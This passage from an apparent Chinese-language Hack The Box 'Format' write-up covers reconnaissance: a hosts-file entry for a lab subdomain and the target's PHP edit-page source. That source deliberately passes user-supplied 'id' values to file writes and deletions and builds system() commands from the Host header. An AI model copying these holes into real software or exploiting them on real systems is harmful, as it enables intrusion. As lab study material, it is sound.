string">".pro"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"display"</span><span class="token punctuation">,</span> <span class="token string">"none"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> queryString <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>queryString<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>queryString<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">const</span> status <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">)</span>                <span class="token keyword">const</span> message <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".floating-message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"display"</span><span class="token punctuation">,</span> <span class="token string">"block"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".floating-message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">children</span><span class="token punctuation">(</span><span class="token string">".message-content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">===</span> <span class="token string">"fail"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".floating-message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"background-color"</span><span class="token punctuation">,</span> <span class="token string">"#AF0606"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".floating-message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"background-color"</span><span class="token punctuation">,</span> <span class="token string">"#4BB543"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>有这么一段代码，发现其中有一段<code>http://$&#123;sites[i]&#125;.microblog.htb</code>​</p><p>而<code>sites</code>​又是我们自己定义的<code>const sites = [&quot;qingfeng&quot;];</code>​</p><p>所以这里我们添加<code>/etc/hosts</code>​解析访问看看：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> <span class="token keyword">echo</span> 10.10.11.213 qingfeng.format.htb <span class="token operator">>></span> /etc/hosts</code></pre><p>​<img src="/Blogimages/HTB_Format/image-20230602164906-t84crtj.png" alt="image">​</p><p>发现成功访问，而且下面还有一个<code>@2022 Microblog</code>​</p><p>后来访问3000端口</p><p>​<img src="/Blogimages/HTB_Format/image-20230602223006-4yghr4c.png" alt="image">​</p><p>有它的源码</p><p>我们看一下<code>/edit/index.php</code>​</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">session_name</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_set_cookie_params</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'.microblog.htb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"bulletproof.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">require_once</span> <span class="token string">"bulletproof.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">checkUserOwnsBlog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$redis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Redis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$redis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'/var/run/redis/redis.sock'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$subdomain</span> <span class="token operator">=</span> <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$userSites</span> <span class="token operator">=</span> <span class="token variable">$redis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">LRANGE</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">":sites"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$subdomain</span><span class="token punctuation">,</span> <span class="token variable">$userSites</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">provisionProUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isPro</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$blogName</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">getBlogName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +w /var/www/microblog/"</span> <span class="token punctuation">.</span> <span class="token variable">$blogName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +w /var/www/microblog/"</span> <span class="token punctuation">.</span> <span class="token variable">$blogName</span> <span class="token punctuation">.</span> <span class="token string">"/edit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cp /var/www/pro-files/bulletproof.php /var/www/microblog/"</span> <span class="token punctuation">.</span> <span class="token variable">$blogName</span> <span class="token punctuation">.</span> <span class="token string">"/edit/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"mkdir /var/www/microblog/"</span> <span class="token punctuation">.</span> <span class="token variable">$blogName</span> <span class="token punctuation">.</span> <span class="token string">"/uploads &amp;&amp; chmod 700 /var/www/microblog/"</span> <span class="token punctuation">.</span> <span class="token variable">$blogName</span> <span class="token punctuation">.</span> <span class="token string">"/uploads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod -w /var/www/microblog/"</span> <span class="token punctuation">.</span> <span class="token variable">$blogName</span> <span class="token punctuation">.</span> <span class="token string">"/edit &amp;&amp; chmod -w /var/www/microblog/"</span> <span class="token punctuation">.</span> <span class="token variable">$blogName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//always check user owns blog before proceeding with any actions</span><span class="token function">checkUserOwnsBlog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//provision pro environment for new pro users</span><span class="token function">provisionProUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//delete section</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"order.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"order.txt"</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//delete image file if content is image</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$img_check</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$img_check</span> <span class="token operator">===</span> <span class="token string">"&lt;div class = \"blog-image\">"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$startsAt</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">"&lt;img src = \"/uploads/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"&lt;img src = \"/uploads/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$endsAt</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">"\" />&lt;/div>"</span><span class="token punctuation">,</span> <span class="token variable">$startsAt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fileToDelete</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$startsAt</span><span class="token punctuation">,</span> <span class="token variable">$endsAt</span> <span class="token operator">-</span> <span class="token variable">$startsAt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../uploads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_pointer</span> <span class="token operator">=</span> <span class="token variable">$fileToDelete</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file_pointer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$file_pointer</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file_pointer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"Section deleted successfully"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//add header</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'header'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string">"&lt;div class = \"blog-h1 blue-fill\">&lt;b>{$_POST['header']}&lt;/b>&lt;/div>"</span><span class="token punctuation">;</span>    <span class="token variable">$post_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"{$_POST['id']}"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$post_file</span><span class="token punctuation">,</span> <span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$post_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$order_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"order.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$order_file</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$order_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /edit?message=Section added!&amp;status=success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//add text</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt_nl</span> <span class="token operator">=</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string">"&lt;div class = \"blog-text\">{$txt_nl}&lt;/div>"</span><span class="token punctuation">;</span>    <span class="token variable">$post_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"{$_POST['id']}"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$post_file</span><span class="token punctuation">,</span> <span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$post_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$order_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"order.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$order_file</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$order_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /edit?message=Section added!&amp;status=success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//add image</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isPro</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"false"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string">"Pro subscription required to upload images"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /edit?message=Pro subscription required&amp;status=fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bulletproof<span class="token punctuation">\</span>Image</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$image</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setLocation</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../uploads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$image</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setSize</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">3000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$image</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMime</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">[</span><span class="token string">"image"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token variable">$image</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$upload_path</span> <span class="token operator">=</span> <span class="token string">"/uploads/"</span> <span class="token punctuation">.</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">".png"</span><span class="token punctuation">;</span>            <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string">"&lt;div class = \"blog-image\">&lt;img src = \"{$upload_path}\" />&lt;/div>"</span><span class="token punctuation">;</span>            <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$post_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"{$_POST['id']}"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$post_file</span><span class="token punctuation">,</span> <span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$post_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$order_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"order.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$order_file</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$order_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /edit?message=Image uploaded successfully&amp;status=success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /edit?message=Image upload failed&amp;status=fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">isPro</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$redis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Redis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$redis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'/var/run/redis/redis.sock'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pro</span> <span class="token operator">=</span> <span class="token variable">$redis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">HGET</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"pro"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$pro</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string">"false"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getBlogName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">'"'</span> <span class="token punctuation">.</span> <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$redis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Redis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$redis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'/var/run/redis/redis.sock'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$firstName</span> <span class="token operator">=</span> <span class="token variable">$redis</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">HGET</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"first-name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"\""</span> <span class="token punctuation">.</span> <span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$firstName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fetchPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/../content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$order</span> 